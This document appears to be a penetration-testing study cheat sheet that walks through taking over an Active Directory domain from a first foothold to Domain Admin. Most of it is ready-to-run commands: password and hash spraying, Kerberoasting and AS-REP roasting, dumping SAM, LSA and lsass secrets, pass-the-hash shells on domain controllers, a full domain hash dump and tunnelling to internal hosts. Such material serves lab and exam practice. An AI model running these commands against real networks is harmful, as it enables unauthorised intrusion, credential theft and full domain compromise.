# Active Directory Decision Flow

Use this when you have **any** domain foothold (assumed-breach user or cracked local path).

## Level 0 — Can I authenticate?

```text
Have user + password or NT hash or ticket?
  NO  → continue external/local enum; spray only what you found
  YES → Level 1
```

```bash
nxc smb DC_OR_TARGETS -u USER -p PASS
nxc smb DC_OR_TARGETS -u USER -H NTHASH
nxc winrm TARGET -u USER -p PASS
```

---

## Level 1 — Where am I admin?

```text
Spray creds across the AD host list
  │
  ├─ Pwn3d! / ADMIN$  → Level 3 (dump this host)
  ├─ Valid user, no admin → Level 2 (enumerate as user)
  └─ Fail everywhere → wrong domain/format, lockout, or bad secret
```

```bash
nxc smb targets.txt -u USER -p PASS --continue-on-success
nxc smb targets.txt -u USER -H NTHASH --continue-on-success
```

---

## Level 2 — Domain user playbook (no local admin yet)

Run **in parallel** (note results in loot table):

| # | Action | Why |
|---|--------|-----|
| 1 | LDAP/users/groups/computers | Map domain |
| 2 | Kerberoast | Weak service passwords |
| 3 | AS-REP roast | Pre-auth disabled users |
| 4 | Readable shares / SYSVOL | Scripts with passwords |
| 5 | BloodHound / ACL glance | Short paths to DA |
| 6 | Session hunting | Where DA is logged on |
| 7 | MSSQL with domain creds | xp_cmdshell / links |
| 8 | Password reuse on local Admin | `-d .` local auth |

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request -outputfile tgs.txt
impacket-GetNPUsers domain/user:pass -request -dc-ip DC -format hashcat
nxc smb targets.txt -u USER -p PASS --shares
nxc smb targets.txt -u Administrator -d '.' -H NTHASH --continue-on-success
```

```text
Crack roast hashes offline while you keep enumerating
New password/hash? → back to Level 1
```

---

## Level 3 — Local admin / SYSTEM on a domain host

**Loot order (do not skip):**

```text
1. whoami /all + network routes (dual-homed?)
2. PowerShell history
3. SAM/LSA/lsass (secretsdump, procdump, mimikatz)
4. Tickets in memory
5. Interesting files, browsers, unattend, web.config
6. If dual-homed → stand up pivot NOW
```

```bash
impacket-secretsdump domain/user:pass@TARGET
impacket-secretsdump -hashes :NTHASH domain/user@TARGET
```

```powershell
type (Get-PSReadlineOption).HistorySavePath
```

```text
New DA / high-value hash? → Level 4
Only local Admin? → spray that hash as local + domain variants → Level 1
```

---

## Level 4 — Domain Admin (or equivalent)

```text
Confirm DA group / replication rights
  → DC via psexec / wmiexec / evil-winrm / RDP
  → proof.txt + screenshot
  → optional: secretsdump -just-dc (lab learning)
```

```bash
impacket-psexec -hashes :DA_HASH domain/Administrator@DC
evil-winrm -i DC -u Administrator -H DA_HASH
impacket-secretsdump -just-dc domain/Administrator@DC -hashes :DA_HASH
```

---

## Credential decision matrix

| You have | Prefer |
|----------|--------|
| Cleartext password | WinRM, RDP, SMB, MSSQL, spray |
| NTLM hash | PTH (psexec/wmiexec/nxc/evil-winrm); RDP if Restricted Admin |
| TGT / TGS | `KRB5CCNAME` + `-k -no-pass` or `kerberos::ptt` |
| Local Admin only | Dump → domain users from lsass; spray |
| Service account | Kerberoast already done; check SPN host access |
| SQL sysadmin | xp_cmdshell → service account → Potato |

---

## Pivot decision

```text
Can Kali reach the next host directly?
  YES → attack from Kali
  NO  →
      Is current host dual-homed / can route?
        YES → ligolo-ng or chisel SOCKS → rescan internal
        NO  → need different foothold or port forward chain
```

See [06-pivoting/tunneling.md](../06-pivoting/tunneling.md).

---

## “What next?” when overwhelmed

Work top to bottom; stop when you get a new secret or admin:

1. **History / files / shares** on hosts you already own  
2. **Spray** every secret you have  
3. **Roast** (Kerberoast + AS-REP)  
4. **BloodHound** shortest path (if available)  
5. **MSSQL / marked interesting services** with domain creds  
6. **Coercion/relay** only if signing-disabled targets exist and path is clear  
7. Park advanced ADCS/delegation unless path is obvious  

---

## Anti-patterns

| Avoid | Prefer |
|-------|--------|
| Blind CVE spray on DC first | User enum + cred reuse |
| Ignoring dual-homed routes | Tunnel within minutes of SYSTEM |
| One hash tried on one host | `--continue-on-success` everywhere |
| Fancy tickets before simple PTH | Hash → admin shell |
| Leaving crack jobs idle | Start hashcat early, keep hacking |

---

## One-page loop

```text
        ┌──────────────────────────────┐
        │     Valid secret (any)       │
        └──────────────┬───────────────┘
                       ▼
              Auth test + spray
                       │
         ┌─────────────┴─────────────┐
         ▼                           ▼
   Local admin?                  Domain user only
         │                           │
         ▼                           ▼
   Dump + history              Enum + roast + shares
         │                           │
         └─────────────┬─────────────┘
                       ▼
              New secret? ──yes──► loop
                       │ no
                       ▼
              Pivot / next host / BH path
                       │
                       ▼
                   Domain Admin
```
